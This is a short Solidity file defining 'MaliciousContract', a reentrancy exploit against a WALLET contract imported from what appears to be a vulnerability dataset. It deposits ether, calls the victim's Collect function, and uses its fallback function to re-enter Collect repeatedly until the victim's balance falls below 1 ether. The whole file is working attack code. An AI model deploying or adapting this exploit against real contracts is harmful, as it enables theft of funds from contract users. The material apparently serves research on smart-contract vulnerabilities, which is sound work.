pragma solidity ^0.4.24;

import "../dataset/reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract MaliciousContract {
    WALLET wallet;

    constructor(address _victimAddress) public {
        wallet = WALLET(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(
            amount >= 1 ether,
            "Must attempt and attack with at least 1 ether"
        );
        wallet.Collect(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        wallet.Put.value(msg.value)(0);
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(wallet).balance >= 1 ether) {
            wallet.Collect(1 ether);
        }
    }
}
